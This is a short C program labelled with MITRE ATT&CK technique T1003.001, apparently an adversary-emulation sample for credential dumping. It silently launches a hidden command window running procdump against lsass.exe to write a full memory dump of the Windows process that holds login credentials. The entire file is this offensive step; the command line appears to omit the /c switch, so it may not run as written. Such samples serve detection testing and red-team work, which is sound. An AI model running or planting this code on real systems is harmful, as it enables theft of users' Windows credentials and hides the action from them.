// Link      = https://attack.mitre.org/techniques/T1003/001/
// Technique = OS Credential Dumping: LSASS Memory
// ID        = T1003.001
// Tactics   = Credential Access

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "procdump -ma lsass.exe lsass_dump",
        NULL,
        SW_HIDE
    );


    return 0;
}


